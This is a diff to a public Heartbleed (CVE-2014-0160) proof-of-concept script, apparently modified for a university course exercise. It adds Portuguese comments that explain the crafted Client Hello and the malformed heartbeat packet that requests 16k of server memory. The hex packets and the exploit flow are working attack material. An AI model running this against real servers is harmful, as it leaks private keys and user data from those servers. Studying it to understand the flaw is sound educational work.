@@ -2,6 +2,11 @@
 
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
+#------------------
+# Codigo modificado para o EP4 - MAC448
+# 1) Inserido comentarios explicativos
+# 2) Nao exibe mais linhas vazias no hexdump
+# 3) Todos os heartbeats sao monitorados agora
 
 import sys
 import struct
@@ -17,7 +22,9 @@ options.add_option('-p', '--port', type='int', default=443, help='TCP port to te
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
-#mensagem de ola para o servidor
+#mensagem de ola para o servidor (Client Hello - RFC 5246)
+#--faz o handshake e especifica os tipos de certificados aceitos
+#--e extensoes aceitas (HB = 00 0f 00 01 01)
 hello = h2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
@@ -36,7 +43,11 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0f 00 01 01
 ''')
 
-#heartbeat para o servidor
+#heartbeat para o servidor (RFC 6520)
+#18 = indica que eh um hearbeat
+#03 02 = versao do TLS: 1.1
+#00 03 = tamanho da mensagem: 3 bytes
+#01 40 00 = mensagem do HB, onde 40 00 eh o payload = 16k
 hb = h2bin('''
 18 03 02 00 03
 01 40 00
@@ -44,6 +55,7 @@ hb = h2bin('''
 
 #faz o dump hexadecimal da mensagem recebida
 def hexdump(s):
+    print "tamanho s: ",len(s)
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
@@ -147,7 +159,6 @@ def main():
     #envia HEARTBEAT
     print 'Sending heartbeat request...'
     sys.stdout.flush()
-    s.send(hb)
     hit_hb(s)
     #+++++++++++++++++++++++++++++++++++++++++++++
 
